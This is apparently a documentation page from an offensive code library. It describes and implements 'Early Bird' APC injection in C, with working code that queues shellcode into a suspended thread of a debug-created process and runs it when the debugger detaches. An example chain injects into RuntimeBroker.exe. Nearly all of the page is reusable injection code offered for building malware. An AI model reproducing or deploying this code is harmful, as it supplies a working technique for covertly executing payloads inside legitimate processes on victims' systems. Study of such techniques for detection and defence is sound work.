## Remote APC Injection (Early Bird) via DEBUG_PROCESS

Executes a payload already written to a remote process using Early Bird APC Injection. Queues the payload's remote base address to the debugged process's suspended thread via `QueueUserAPC`, then detaches the debugger with `DebugActiveProcessStop` which resumes all threads and triggers the queued APC. Requires the target process to have been created with `DEBUG_PROCESS` via `CreateSuspendedProcess2` and the payload to have been written via `InjectShellcodeToRemoteProcess`.

**Usage**

Call `EarlyBirdApcInjection` with the suspended thread handle, the remote payload address, and the target process PID. After a `TRUE` return, `DebugActiveProcessStop` resumes the debugged process and the queued APC fires on first scheduling.

- `IN HANDLE hThread`  Handle to the suspended thread of the debugged remote process.
- `IN PVOID pAddress`  Base address of the payload in the remote process's address space.
- `IN DWORD dwProcessId`  PID of the debugged remote process — passed to `DebugActiveProcessStop`.

**Return Value**

`BOOL`  Returns `TRUE` if the APC was successfully queued and the debugger detached, otherwise `FALSE`.

**External Files**

- `windows.h`  `BOOL`, `HANDLE`, `PVOID`, `DWORD`, `IN`, `QueueUserAPC()`, `DebugActiveProcessStop()`, `GetLastError()`
- `stdio.h`  `printf()`, `getchar()`


### Code

```c
#include <windows.h>
#include <stdio.h>


BOOL EarlyBirdApcInjection(IN HANDLE hThread, IN PVOID pAddress, IN DWORD dwProcessId) {

    // Queue the payload to the debugged process's suspended thread.
    // The APC will fire once the thread is resumed by DebugActiveProcessStop.
    if (!QueueUserAPC(
        (PAPCFUNC)pAddress, // Address of the APC function — remote payload base address.
        hThread,            // Handle to the suspended thread of the debugged process.
        NULL                // No parameter passed to the APC function.
    )) {
        printf("[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[#] Press <Enter> To Run Shellcode ... ");
    getchar();

    // Detach the debugger from the remote process.
    // This resumes all suspended threads and triggers the queued APC.
    if (!DebugActiveProcessStop(dwProcessId)) {
        printf("[!] DebugActiveProcessStop Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Debugger Detached — Payload Executing \n");

    return TRUE;
}
```

**Example**

```c
HANDLE  hProcess    = NULL,
        hThread     = NULL;
DWORD   dwProcessId = NULL;
PVOID   pAddress    = NULL;

// Step 1: Create the target process in debug mode (threads start suspended).
CreateSuspendedProcess2("RuntimeBroker.exe", &dwProcessId, &hProcess, &hThread);

// Step 2: Write and protect the payload in the remote process's address space.
InjectShellcodeToRemoteProcess(hProcess, pPayload, sPayloadSize, &pAddress);

// Step 3: Queue the payload to the suspended thread and detach to trigger execution.
EarlyBirdApcInjection(hThread, pAddress, dwProcessId);

CloseHandle(hProcess);
CloseHandle(hThread);
```
